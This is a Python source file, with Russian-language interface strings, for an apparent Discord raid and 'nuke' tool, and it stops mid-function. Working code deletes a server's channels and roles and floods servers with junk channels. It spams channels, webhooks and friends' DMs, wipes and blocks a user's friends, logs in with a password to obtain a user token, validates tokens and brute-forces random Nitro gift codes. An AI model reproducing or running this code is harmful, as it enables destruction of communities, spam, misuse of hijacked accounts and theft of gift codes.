import asyncio
import base64
import getpass
import json
import logging
import os
import random
import secrets
import socket
import string
import struct
import sys
import time
import threading
from logging.handlers import RotatingFileHandler
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import aiohttp
import requests
import websockets
from colorama import Fore, Style, init
from nacl.secret import SecretBox

try:
    import opuslib
    OPUSLIB_AVAILABLE = True
    try:
        from opuslib import OPUS_APPLICATION_AUDIO
    except ImportError:
        try:
            from opuslib.constants import OPUS_APPLICATION_AUDIO
        except ImportError:
            OPUS_APPLICATION_AUDIO = 2049
except ImportError:
    OPUSLIB_AVAILABLE = False

init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        RotatingFileHandler("fancy_tool.log", maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    ]
)
logger = logging.getLogger(__name__)

if not OPUSLIB_AVAILABLE:
    logger.warning("opuslib не установлен, голосовая атака будет недоступна")

R = Fore.RED
W = Fore.WHITE
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
RS = Style.RESET_ALL

API_BASE = "https://discord.com/api/v9"
GATEWAY_URL = "wss://gateway.discord.gg/?v=10&encoding=json"
MAX_RETRIES = 3
NON_RETRYABLE_STATUSES = {401, 403, 404}
RETRYABLE_SERVER_ERRORS = {502, 503, 504}
VOICE_OP_TIMEOUT = 15
GATEWAY_EVENT_TIMEOUT = 15
IP_DISCOVERY_TIMEOUT = 5
VALID_AFK_TIMEOUTS = {60, 300, 900, 1800, 3600}
VALID_REGIONS = {
    "us-west", "us-east", "us-central", "us-south",
    "europe", "russia", "brazil", "hongkong", "india",
    "japan", "sydney", "southafrica", "singapore"
}

PERMISSION_FLAGS = {
    "CREATE_INSTANT_INVITE": 1 << 0, "KICK_MEMBERS": 1 << 1,
    "BAN_MEMBERS": 1 << 2, "ADMINISTRATOR": 1 << 3,
    "MANAGE_CHANNELS": 1 << 4, "MANAGE_GUILD": 1 << 5,
    "ADD_REACTIONS": 1 << 6, "VIEW_AUDIT_LOG": 1 << 7,
    "PRIORITY_SPEAKER": 1 << 8, "STREAM": 1 << 9,
    "VIEW_CHANNEL": 1 << 10, "SEND_MESSAGES": 1 << 11,
    "SEND_TTS_MESSAGES": 1 << 12, "MANAGE_MESSAGES": 1 << 13,
    "EMBED_LINKS": 1 << 14, "ATTACH_FILES": 1 << 15,
    "READ_MESSAGE_HISTORY": 1 << 16, "MENTION_EVERYONE": 1 << 17,
    "USE_EXTERNAL_EMOJIS": 1 << 18, "VIEW_GUILD_INSIGHTS": 1 << 19,
    "CONNECT": 1 << 20, "SPEAK": 1 << 21,
    "MUTE_MEMBERS": 1 << 22, "DEAFEN_MEMBERS": 1 << 23,
    "MOVE_MEMBERS": 1 << 24, "USE_VAD": 1 << 25,
    "CHANGE_NICKNAME": 1 << 26, "MANAGE_NICKNAMES": 1 << 27,
    "MANAGE_ROLES": 1 << 28, "MANAGE_WEBHOOKS": 1 << 29,
    "MANAGE_EMOJIS_AND_STICKERS": 1 << 30, "USE_APPLICATION_COMMANDS": 1 << 31,
    "REQUEST_TO_SPEAK": 1 << 32, "MANAGE_EVENTS": 1 << 33,
    "MANAGE_THREADS": 1 << 34, "CREATE_PUBLIC_THREADS": 1 << 35,
    "CREATE_PRIVATE_THREADS": 1 << 36, "USE_EXTERNAL_STICKERS": 1 << 37,
    "SEND_MESSAGES_IN_THREADS": 1 << 38, "USE_EMBEDDED_ACTIVITIES": 1 << 39,
    "MODERATE_MEMBERS": 1 << 40,
}

COLOR_PRESETS = {
    "1": ("красный", 0xFF0000), "2": ("оранжевый", 0xFF7F00),
    "3": ("жёлтый", 0xFFFF00), "4": ("зелёный", 0x00FF00),
    "5": ("голубой", 0x00FFFF), "6": ("синий", 0x0000FF),
    "7": ("фиолетовый", 0x8B00FF), "8": ("розовый", 0xFF69B4),
    "9": ("белый", 0xFFFFFF), "10": ("серый", 0x808080),
    "11": ("чёрный", 0x000000), "12": ("золотой", 0xFFD700),
    "13": ("бирюзовый", 0x40E0D0), "14": ("лаймовый", 0x32CD32),
    "15": ("пурпурный", 0x800080),
}


class Intent(Enum):
    GUILDS = 1 << 0
    GUILD_VOICE_STATES = 1 << 18


class RelationshipType(Enum):
    FRIEND = 1
    BLOCKED = 2


@dataclass
class ValidationResult:
    valid: bool
    type: str
    info: str
    status_code: int


@dataclass
class VoiceData:
    endpoint: str = ""
    session_id: str = ""
    token: str = ""
    user_id: str = ""
    ip: str = ""
    port: int = 0
    ssrc: int = 0
    secret_key: bytes = field(default_factory=bytes)
    mode: str = "xsalsa20_poly1305"


class HttpClient:
    def __init__(self, token: Optional[str] = None) -> None:
        self._session = requests.Session()
        self._session.headers.update({
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        if token:
            self._session.headers["Authorization"] = token

    def set_token(self, token: str) -> None:
        self._session.headers["Authorization"] = token

    @staticmethod
    def _safe_json(response: requests.Response) -> Dict[str, Any]:
        try:
            return response.json()
        except json.JSONDecodeError:
            return {"error": response.text[:200]}

    @staticmethod
    def _safe_list(data: Any) -> List[Dict[str, Any]]:
        return data if isinstance(data, list) else []

    def _request_with_retry(self, method: str, path: str, **kwargs) -> requests.Response:
        url = f"{API_BASE}/{path.lstrip('/')}"
        kwargs.setdefault("timeout", 15)
        last_response = None
        for attempt in range(MAX_RETRIES):
            try:
                response = self._session.request(method, url, **kwargs)
                last_response = response
                if response.status_code == 429:
                    try:
                        data = response.json()
                        retry_after = float(data.get("retry_after", 1))
                        logger.warning(f"429 hit, waiting {retry_after:.1f}s (attempt {attempt+1}/{MAX_RETRIES})")
                        time.sleep(retry_after)
                        continue
                    except Exception:
                        time.sleep(1)
                        continue
                if response.status_code in NON_RETRYABLE_STATUSES:
                    return response
                if response.status_code in RETRYABLE_SERVER_ERRORS and attempt < MAX_RETRIES - 1:
                    retry_after_header = response.headers.get("Retry-After")
                    wait = float(retry_after_header) if retry_after_header else 2
                    logger.warning(f"Server error {response.status_code}, retrying in {wait}s...")
                    time.sleep(wait)
                    continue
                if response.status_code >= 500 and attempt < MAX_RETRIES - 1:
                    logger.warning(f"Unknown server error {response.status_code}, retrying...")
                    time.sleep(1)
                    continue
                return response
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout on attempt {attempt+1}/{MAX_RETRIES}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(1)
                    continue
                raise
            except requests.exceptions.ConnectionError as e:
                logger.warning(f"Connection error on attempt {attempt+1}/{MAX_RETRIES}: {e}")
                if attempt < MAX_RETRIES - 1:
                    time.sleep(2)
                    continue
                raise
        return last_response or response
    
    @staticmethod
    def _sanitize_bot_token(token: str) -> str:
        return token.replace("Bot ", "").replace("bot ", "").strip()


class TokenOperations(HttpClient):
    def nuke_guild(self, guild_id: str) -> str:
        if not guild_id:
            return "айди сервера не дал"
        try:
            resp = self._request_with_retry("GET", f"guilds/{guild_id}/channels")
            if resp.status_code == 200:
                for ch in self._safe_list(self._safe_json(resp)):
                    if "id" in ch:
                        self._request_with_retry("DELETE", f"channels/{ch['id']}")
                        time.sleep(0.2)
            resp = self._request_with_retry("GET", f"guilds/{guild_id}/roles")
            if resp.status_code == 200:
                for role in self._safe_list(self._safe_json(resp)):
                    if role.get("name") != "@everyone" and "id" in role:
                        self._request_with_retry("DELETE", f"guilds/{guild_id}/roles/{role['id']}")
                        time.sleep(0.2)
            return "сервер занюкан"
        except Exception as e:
            return f"ошибка: {e}"

    def get_info(self) -> str:
        try:
            resp = self._request_with_retry("GET", "users/@me")
            if resp.status_code != 200:
                return f"токен невалид: {resp.status_code}"
            data = resp.json()
            discrim = data.get("discriminator", "0")
            username = data["username"] if discrim == "0" else f"{data['username']}#{discrim}"
            phone = data.get('phone', 'нет')
            if phone and phone != 'нет':
                phone = f"+{phone}"
            return (
                f"id: {data['id']}\nимя: {username}\n"
                f"почта: {data.get('email', 'нет')}\nтелефон: {phone}\n"
                f"нитро: {data.get('premium_type', 0)}\n"
                f"верификация: {data.get('verified', False)}\n"
                f"mfa: {data.get('mfa_enabled', False)}\nязык: {data.get('locale', 'нет')}"
            )
        except Exception as e:
            return f"ошибка: {e}"

    def join_invite(self, code: str) -> str:
        try:
            if not code or not code.strip():
                return "код инвайта не указан"
            if "discord.gg/" in code:
                code = code.split("discord.gg/")[-1]
            if "discord.com/invite/" in code:
                code = code.split("discord.com/invite/")[-1]
            code = code.strip()
            resp = self._request_with_retry("POST", f"invites/{code}")
            if resp.status_code == 200:
                data = self._safe_json(resp)
                guild = data.get('guild')
                if guild:
                    return f"зашёл на сервер: {guild.get('name', 'неизвестно')}"
                channel = data.get('channel')
                if channel:
                    return f"вошли в канал: {channel.get('name', 'неизвестно')}"
                return "вошли но тип не определён"
            if resp.status_code == 404:
                return "инвайт не найден или просрочен"
            return f"ошибка: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def leave_guild(self, guild_id: str) -> str:
        try:
            resp = self._request_with_retry("DELETE", f"users/@me/guilds/{guild_id}")
            if resp.status_code == 204:
                return "вышел с сервера"
            if resp.status_code == 404:
                return "сервер не найден"
            return f"ошибка: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def login(self, email: str, password: str, captcha_key: Optional[str] = None) -> str:
        try:
            payload = {"login": email, "password": password, "undelete": False}
            if captcha_key:
                payload["captcha_key"] = captcha_key
            resp = self._request_with_retry("POST", "auth/login", json=payload)
            if resp.status_code == 200:
                data = self._safe_json(resp)
                token = data.get('token')
                if token:
                    self.set_token(token)
                    return f"токен: {token}"
                if data.get('mfa'):
                    return "требуется mfa код (не поддерживается)"
                if data.get('captcha_key'):
                    return "требуется капча. используй login с captcha_key"
                return "неожиданный ответ сервера"
            if resp.status_code == 400:
                return "неверный логин или пароль"
            return f"логин не удался: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def decode_token(self) -> str:
        try:
            token = self._session.headers.get("Authorization", "")
            parts = token.split(".")
            if len(parts) < 3:
                return "невалидный формат токена"
            payload = parts[1] + "=" * (-len(parts[1]) % 4)
            data = json.loads(base64.b64decode(payload).decode())
            iat = data.get('iat', 0)
            exp = data.get('exp', 0)
            created = datetime.fromtimestamp(iat, tz=timezone.utc) if iat else "неизвестно"
            expires = datetime.fromtimestamp(exp, tz=timezone.utc) if exp else "неизвестно"
            return f"id: {data.get('uid', 'нет')}\nник: {data.get('username', 'нет')}\nвыдан: {created}\nистекает: {expires}"
        except Exception as e:
            return f"не декодилось: {e}"

    def raid_server(self, guild_id: str) -> str:
        try:
            created = 0
            channel_names = ["рейд", "нюк", "краш", "дестрой", "owned", "троллинг", "захват", "слив"]
            for i in range(50):
                name = f"{random.choice(channel_names)}-{i}"
                resp = self._request_with_retry("POST", f"guilds/{guild_id}/channels", json={"name": name, "type": 0})
                if resp.status_code == 201:
                    created += 1
                time.sleep(0.15)
            return f"создано {created}/50 каналов"
        except Exception as e:
            return f"ошибка: {e}"

    def spam_channel(self, channel_id: str, message: str, count: int = 100) -> str:
        if count <= 0:
            return "количество должно быть положительным"
        try:
            sent = 0
            for i in range(count):
                resp = self._request_with_retry("POST", f"channels/{channel_id}/messages", json={"content": f"{message} {i}"})
                if resp.status_code == 200:
                    sent += 1
                time.sleep(0.08)
            return f"отправлено {sent}/{count}"
        except Exception as e:
            return f"ошибка: {e}"

    def spam_channel_with_file(self, channel_id: str, message: str, file_bytes: bytes, filename: str, count: int = 1) -> str:
        if count <= 0:
            return "количество должно быть положительным"
        try:
            sent = 0
            for i in range(count):
                files = {'file': (filename, file_bytes)}
                data = {'content': f"{message} {i}"}
                resp = self._session.post(
                    f"{API_BASE}/channels/{channel_id}/messages",
                    data=data, files=files,
                    headers={"Authorization": self._session.headers.get("Authorization")},
                    timeout=15
                )
                if resp.status_code == 200:
                    sent += 1
                elif resp.status_code == 429:
                    try:
                        retry_after = float(resp.json().get("retry_after", 1))
                        time.sleep(retry_after)
                    except Exception:
                        time.sleep(1)
                else:
                    logger.warning(f"файл не отправлен: {resp.status_code}")
                time.sleep(0.5)
            return f"отправлено {sent}/{count} сообщений с файлом"
        except Exception as e:
            return f"ошибка: {e}"

    def delete_friends(self) -> str:
        try:
            resp = self._request_with_retry("GET", "users/@me/relationships")
            if resp.status_code != 200:
                return f"ошибка: {resp.status_code}"
            friends = [rel for rel in self._safe_list(resp.json()) if rel.get("type") == RelationshipType.FRIEND.value]
            deleted = 0
            for rel in friends:
                for _ in range(MAX_RETRIES):
                    del_resp = self._request_with_retry("DELETE", f"users/@me/relationships/{rel['id']}")
                    if del_resp.status_code == 204:
                        deleted += 1
                        break
                    elif del_resp.status_code in NON_RETRYABLE_STATUSES:
                        break
                time.sleep(0.2)
            return f"удалено друзей: {deleted}/{len(friends)}"
        except Exception as e:
            return f"ошибка: {e}"

    def block_friends(self) -> str:
        try:
            resp = self._request_with_retry("GET", "users/@me/relationships")
            if resp.status_code != 200:
                return f"ошибка: {resp.status_code}"
            friends = [rel for rel in self._safe_list(resp.json()) if rel.get("type") == RelationshipType.FRIEND.value]
            blocked = 0
            for rel in friends:
                for _ in range(MAX_RETRIES):
                    put_resp = self._request_with_retry("PUT", f"users/@me/relationships/{rel['id']}", json={"type": RelationshipType.BLOCKED.value})
                    if put_resp.status_code == 204:
                        blocked += 1
                        break
                    elif put_resp.status_code in NON_RETRYABLE_STATUSES:
                        break
                time.sleep(0.2)
            return f"заблокировано друзей: {blocked}/{len(friends)}"
        except Exception as e:
            return f"ошибка: {e}"

    def mass_dm(self, message: str) -> str:
        try:
            resp = self._request_with_retry("GET", "users/@me/relationships")
            if resp.status_code != 200:
                return f"ошибка: {resp.status_code}"
            friends = [rel for rel in self._safe_list(resp.json()) if rel.get("type") == RelationshipType.FRIEND.value]
            sent = 0
            for rel in friends:
                try:
                    channel_resp = self._request_with_retry("POST", "users/@me/channels", json={"recipient_id": rel["id"]})
                    channel = self._safe_json(channel_resp)
                    if "id" in channel:
                        msg_resp = self._request_with_retry("POST", f"channels/{channel['id']}/messages", json={"content": message})
                        if msg_resp.status_code == 200:
                            sent += 1
                    time.sleep(0.2)
                except Exception:
                    pass
            return f"дм разосланы: {sent}/{len(friends)}"
        except Exception as e:
            return f"ошибка: {e}"

    def delete_dms(self) -> str:
        try:
            resp = self._request_with_retry("GET", "users/@me/channels")
            channels = self._safe_list(self._safe_json(resp))
            deleted = 0
            for ch in channels:
                if "id" in ch:
                    for _ in range(MAX_RETRIES):
                        del_resp = self._request_with_retry("DELETE", f"channels/{ch['id']}")
                        if del_resp.status_code in (200, 204):
                            deleted += 1
                            break
                        elif del_resp.status_code in NON_RETRYABLE_STATUSES:
                            break
                    time.sleep(0.15)
            return f"дм удалены: {deleted}/{len(channels)}"
        except Exception as e:
            return f"ошибка: {e}"

    def set_status(self, status: str, custom_text: Optional[str] = None) -> str:
        try:
            valid_statuses = {"online", "idle", "dnd", "invisible"}
            if status not in valid_statuses:
                return f"неверный статус. используй: {', '.join(valid_statuses)}"
            payload: Dict[str, Any] = {"status": status}
            if custom_text:
                payload["custom_status"] = {"text": custom_text}
            resp = self._request_with_retry("PATCH", "users/@me/settings", json=payload)
            return f"статус изменён на {status}: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def set_language(self, lang: str = "ru") -> str:
        try:
            resp = self._request_with_retry("PATCH", "users/@me/settings", json={"locale": lang})
            return f"язык изменён на {lang}: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def set_house(self, house: str = "brilliance") -> str:
        try:
            house_map = {"brilliance": "HOUSE_BRILLIANCE", "bravery": "HOUSE_BRAVERY", "balance": "HOUSE_BALANCE"}
            house_lower = house.lower()
            if house_lower not in house_map:
                return f"неверный дом: {house}. используй: brilliance/bravery/balance"
            resp = self._request_with_retry("PATCH", "users/@me/settings", json={"house_id": house_map[house_lower]})
            return f"дом изменён на {house}: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    def set_theme(self, theme: str = "dark") -> str:
        try:
            if theme not in ("dark", "light"):
                return "тема должна быть dark или light"
            resp = self._request_with_retry("PATCH", "users/@me/settings", json={"theme": theme})
            return f"тема изменена на {theme}: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def generate_token() -> str:
        return ".".join([
            base64.b64encode(secrets.token_bytes(18)).decode().rstrip("="),
            base64.b64encode(secrets.token_bytes(4)).decode().rstrip("="),
            base64.b64encode(secrets.token_bytes(20)).decode().rstrip("="),
        ])

    def leave_voice_channel(self, guild_id: str) -> str:
        try:
            resp = self._request_with_retry("PATCH", f"guilds/{guild_id}/voice-states/@me", json={"channel_id": None})
            if resp.status_code in (200, 204):
                return "вышел из голосового канала"
            return f"ошибка выхода из голосового канала: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"


class BotOperations:
    @staticmethod
    def nuke_guild(bot_token: str, guild_id: str) -> str:
        try:
            bot_token = HttpClient._sanitize_bot_token(bot_token)
            headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json", "User-Agent": "DiscordBot"}
            session = requests.Session()
            session.headers.update(headers)
            def req_with_retry(method, path, **kwargs):
                url = f"{API_BASE}/{path.lstrip('/')}"
                last_resp = None
                for attempt in range(MAX_RETRIES):
                    try:
                        resp = session.request(method, url, timeout=15, **kwargs)
                        last_resp = resp
                        if resp.status_code == 429:
                            try:
                                retry_after = float(resp.json().get("retry_after", 1))
                                time.sleep(retry_after)
                                continue
                            except Exception:
                                time.sleep(1)
                                continue
                        if resp.status_code in NON_RETRYABLE_STATUSES:
                            return resp
                        if resp.status_code in RETRYABLE_SERVER_ERRORS and attempt < MAX_RETRIES - 1:
                            wait = 2 ** attempt
                            time.sleep(wait)
                            continue
                        return resp
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        if attempt < MAX_RETRIES - 1:
                            time.sleep(1)
                            continue
                        raise
                return last_resp
            resp = req_with_retry("GET", f"guilds/{guild_id}/channels")
            try:
                channels = resp.json() if resp.status_code == 200 else []
            except json.JSONDecodeError:
                channels = []
            if isinstance(channels, list):
                for ch in channels:
                    if "id" in ch:
                        req_with_retry("DELETE", f"channels/{ch['id']}")
                        time.sleep(0.15)
            created = 0
            for i in range(100):
                resp = req_with_retry("POST", f"guilds/{guild_id}/channels", json={"name": f"нюк-{i}", "type": 0})
                if resp.status_code == 201:
                    created += 1
                time.sleep(0.1)
            return f"бот занюкал сервер: создано {created}/100 каналов"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def create_invite(bot_token: str, guild_id: str) -> str:
        try:
            bot_token = HttpClient._sanitize_bot_token(bot_token)
            headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
            for attempt in range(MAX_RETRIES):
                resp = requests.post(f"{API_BASE}/guilds/{guild_id}/invites", headers=headers, json={"max_age": 0, "max_uses": 0}, timeout=15)
                if resp.status_code == 200:
                    return f"discord.gg/{resp.json().get('code', 'ошибка')}"
                elif resp.status_code == 429:
                    try:
                        retry_after = float(resp.json().get("retry_after", 1))
                        time.sleep(retry_after)
                    except Exception:
                        time.sleep(1)
                elif resp.status_code in NON_RETRYABLE_STATUSES:
                    return f"ошибка создания инвайта: {resp.status_code}"
                elif resp.status_code in RETRYABLE_SERVER_ERRORS and attempt < MAX_RETRIES - 1:
                    time.sleep(2)
            return f"ошибка создания инвайта: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def create_user_invite(token: str, guild_id: str, channel_id: str) -> str:
        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            resp = requests.post(f"{API_BASE}/channels/{channel_id}/invites", headers=headers, json={"max_age": 0, "max_uses": 0}, timeout=15)
            if resp.status_code == 200:
                return f"discord.gg/{resp.json().get('code', 'ошибка')}"
            return f"ошибка создания инвайта: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"


class WebhookOperations:
    @staticmethod
    def get_info(url: str) -> str:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code != 200:
                return f"вебхук невалид: {resp.status_code}"
            data = resp.json()
            return f"имя: {data['name']}\nканал: {data['channel_id']}\nсервер: {data.get('guild_id', 'нет')}\nаватар: {data.get('avatar', 'нет')}\nтип: {data.get('type', 'неизвестно')}"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def delete(url: str) -> str:
        try:
            resp = requests.delete(url, timeout=15)
            if resp.status_code == 204:
                return "вебхук удалён"
            if resp.status_code == 404:
                return "вебхук не найден"
            return f"ошибка удаления: {resp.status_code}"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def spam(url: str, message: str, count: int = 100, mode: str = "normal") -> str:
        if not url or not url.strip():
            return "url вебхука не указан"
        if count <= 0:
            return "количество должно быть положительным"
        try:
            sent = 0
            rainbow_colors = [0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3]
            for i in range(count):
                payload: Dict[str, Any] = {}
                if mode == "normal":
                    payload["content"] = f"{message} {i}"
                    payload["username"] = f"Fancy v1-{random.randint(1000, 9999)}"
                elif mode == "rainbow":
                    color = rainbow_colors[i % len(rainbow_colors)]
                    payload["content"] = f"```ansi\n\x1b[38;2;{(color>>16)&0xFF};{(color>>8)&0xFF};{color&0xFF}m{message}\x1b[0m\n```"
                    payload["username"] = f"🌈 Rainbow-{random.randint(1000, 9999)}"
                elif mode == "quote":
                    quotes = ["Величие не в том чтобы никогда не падать а в том чтобы подниматься каждый раз"]
                    payload["content"] = f">>> **Цитата дня:**\n> {random.choice(quotes)}\n\n{message} {i}"
                    payload["username"] = f"📜 Мудрец-{random.randint(1000, 9999)}"
                elif mode == "embed":
                    payload["embeds"] = [{"title": f"Сообщение #{i}", "description": message, "color": random.randint(0, 0xFFFFFF), "footer": {"text": f"Fancy v1 | #{i}/{count}"}, "timestamp": datetime.now(timezone.utc).isoformat()}]
                    payload["username"] = f"📊 Embed-{random.randint(1000, 9999)}"
                elif mode == "sticker":
                    sticker_messages = ["(づ｡◕‿‿◕｡)づ", "ʕ•ᴥ•ʔ", "♥‿♥"]
                    payload["content"] = f"{random.choice(sticker_messages)}\n{message} {i}"
                    payload["username"] = f"🎨 Sticker-{random.randint(1000, 9999)}"
                elif mode == "mixed":
                    modes = ["normal", "rainbow", "quote", "sticker"]
                    chosen = random.choice(modes)
                    if chosen == "normal":
                        payload["content"] = f"{message} {i}"
                    elif chosen == "rainbow":
                        color = rainbow_colors[i % len(rainbow_colors)]
                        payload["content"] = f"```ansi\n\x1b[38;2;{(color>>16)&0xFF};{(color>>8)&0xFF};{color&0xFF}m{message}\x1b[0m\n```"
                    elif chosen == "quote":
                        payload["content"] = f">>> **Факт:**\n> Знание сила\n\n{message} {i}"
                    else:
                        payload["content"] = f"♥‿♥\n{message} {i}"
                    payload["username"] = f"🎲 Mixed-{random.randint(1000, 9999)}"
                else:
                    payload["content"] = f"{message} {i}"
                    payload["username"] = f"Fancy v1-{random.randint(1000, 9999)}"
                for attempt in range(MAX_RETRIES):
                    try:
                        resp = requests.post(url, json=payload, timeout=10)
                        if resp.status_code in (200, 204):
                            sent += 1
                            break
                        elif resp.status_code == 429:
                            try:
                                retry_after = resp.json().get("retry_after", 1)
                                time.sleep(float(retry_after))
                            except Exception:
                                time.sleep(1)
                        elif resp.status_code in NON_RETRYABLE_STATUSES:
                            break
                        elif resp.status_code in RETRYABLE_SERVER_ERRORS and attempt < MAX_RETRIES - 1:
                            time.sleep(2)
                    except requests.exceptions.Timeout:
                        if attempt < MAX_RETRIES - 1:
                            continue
                        break
                time.sleep(0.08)
            return f"отправлено {sent}/{count} в режиме {mode}"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def spam_with_file(url: str, message: str, file_bytes: bytes, filename: str, count: int = 1) -> str:
        if not url or not url.strip():
            return "url вебхука не указан"
        if count <= 0:
            return "количество должно быть положительным"
        try:
            sent = 0
            for i in range(count):
                payload = {"content": f"{message} {i}"}
                files = {'file': (filename, file_bytes)}
                resp = requests.post(
                    url,
                    data={'payload_json': json.dumps(payload)},
                    files=files,
                    timeout=15
                )
                if resp.status_code in (200, 204):
                    sent += 1
                elif resp.status_code == 429:
                    try:
                        retry_after = float(resp.json().get("retry_after", 1))
                        time.sleep(retry_after)
                    except Exception:
                        time.sleep(1)
                else:
                    break
                time.sleep(0.5)
            return f"отправлено {sent}/{count} вебхуков с файлом"
        except Exception as e:
            return f"ошибка: {e}"

    @staticmethod
    def generate() -> str:
        return f"https://discord.com/api/webhooks/{''.join(random.choices(string.digits, k=18))}/{''.join(random.choices(string.ascii_letters + string.digits, k=68))}"


def webhook_spam_menu() -> None:
    print(f"\n{C}{'═' * 60}\n{Y}[ спам вебхуком - выбор режима ]\n{C}{'═' * 60}")
    print(f"{W} 1. {Y}normal{W} - обычный текст\n{W} 2. {Y}rainbow{W} - радужный цветной текст")
    print(f"{W} 3. {Y}quote{W} - цитаты великих людей\n{W} 4. {Y}embed{W} - красивые embed сообщения")
    print(f"{W} 5. {Y}sticker{W} - текстовые стикеры\n{W} 6. {Y}mixed{W} - случайный режим для каждого сообщения")
    print(f"{C}{'═' * 60}")
    mode_choice = input(f"{W}выбери режим (1-6): {RS}").strip()
    mode_map = {"1": "normal", "2": "rainbow", "3": "quote", "4": "embed", "5": "sticker", "6": "mixed"}
    mode = mode_map.get(mode_choice, "normal")
    url = input(f"{W}вебхук ссылка: {RS}")
    msg = input(f"{W}сообщение: {RS}")
    try:
        count = int(input(f"{W}количество (по умолч 100): {RS}") or "100")
    except ValueError:
        count = 100
    print(f"\n{Y}[*] запуск спама в режиме {mode}...{RS}")
    print(WebhookOperations.spam(url, msg, count, mode))


class NitroOperations:
    @staticmethod
    def generate(count: int = 10) -> str:
        chars = string.ascii_letters + string.digits
        return "\n".join(f"https://discord.gift/{''.join(random.choices(chars, k=16))}" for _ in range(count))


class ServerOperations:
    @staticmethod
    def get_info(token: str, guild_id: str) -> str:
        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            resp = requests.get(f"{API_BASE}/guilds/{guild_id}?with_counts=true", headers=headers, timeout=15)
            if resp.status_code != 200:
                return f"инфы нет: {resp.status_code}"
            data = resp.json()
            return f"название: {data['name']}\nвладелец: {data['owner_id']}\nучастников: {data.get('approximate_member_count', '?')}\nонлайн: {data.get('approximate_presence_count', '?')}\nканалов: {len(data.get('channels', []))}\nролей: {len(data.get('roles', []))}\nуровень верификации: {data.get('verification_level', '?')}\nсоздан: {datetime.fromtimestamp(((int(guild_id) >> 22) + 1420070400000) / 1000, tz=timezone.utc)}"
        except Exception as e:
            return f"ошибка: {e}"


class Validator:
    @staticmethod
    def token(token: str) -> ValidationResult:
        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            resp = requests.get(f"{API_BASE}/users/@me", headers=headers, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                discrim = data.get("discriminator", "0")
                username = data["username"] if discrim == "0" else f"{data['username']}#{discrim}"
                return ValidationResult(True, "токен", f"{username} (id: {data['id']})", resp.status_code)
            return ValidationResult(False, "токен", f"невалидный токен ({resp.status_code})", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "токен", str(e), 0)

    @staticmethod
    def nitro(code: str) -> ValidationResult:
        try:
            if "discord.gift/" in code:
                code = code.split("discord.gift/")[-1]
            code = code.strip()
            if len(code) != 16:
                return ValidationResult(False, "нитро", "неверный формат (16 символов)", 0)
            resp = requests.get(f"{API_BASE}/entitlements/gift-codes/{code}?with_application=false", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                return ValidationResult(True, "нитро", f"валидный ({data.get('subscription_plan', {}).get('name', 'неизвестно')})", resp.status_code)
            if resp.status_code == 404:
                return ValidationResult(False, "нитро", "невалидный или использованный", resp.status_code)
            return ValidationResult(False, "нитро", f"ошибка {resp.status_code}", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "нитро", str(e), 0)

    @staticmethod
    def webhook(url: str) -> ValidationResult:
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                return ValidationResult(True, "вебхук", f"{data.get('name', 'без имени')} (канал: {data.get('channel_id', 'нет')})", resp.status_code)
            if resp.status_code == 404:
                return ValidationResult(False, "вебхук", "вебхук не найден", resp.status_code)
            return ValidationResult(False, "вебхук", f"ошибка {resp.status_code}", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "вебхук", str(e), 0)

    @staticmethod
    def server(guild_id: str, token: Optional[str] = None) -> ValidationResult:
        try:
            headers = {"Authorization": token} if token else {}
            resp = requests.get(f"{API_BASE}/guilds/{guild_id}", headers=headers, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                return ValidationResult(True, "сервер", f"{data['name']} (участников: {data.get('approximate_member_count', '?')})", resp.status_code)
            if resp.status_code == 404:
                return ValidationResult(False, "сервер", "сервер не найден или нет доступа", resp.status_code)
            return ValidationResult(False, "сервер", f"ошибка {resp.status_code}", resp.status_code)
        except Exception as e:
            return ValidationResult(False, "сервер", str(e), 0)

    @staticmethod
    def invite(code: str) -> ValidationResult:
        try:
            if "discord.gg/" in code:
                code = code.split("discord.gg/")[-1]
            if "discord.com/invite/" in code:
                code = code.split("discord.com/invite/")[-1]
            code = code.strip()
            resp = requests.get(f"{API_BASE}/invites/{code}?with_counts=true", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                guild = data.get("guild", {})
                channel = data.get("channel", {})
